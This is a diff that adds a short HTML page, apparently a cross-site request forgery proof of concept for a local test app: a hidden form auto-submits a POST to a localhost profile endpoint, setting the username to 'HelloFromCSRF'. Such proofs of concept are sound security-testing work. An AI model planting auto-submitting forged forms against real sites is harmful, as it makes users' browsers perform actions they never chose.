@@ -1,0 +1,10 @@
+<html>
+  <body>
+    <form action="http://127.0.0.1:3000/profile" method="POST">
+      <input type="hidden" name="username" value="HelloFromCSRF" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
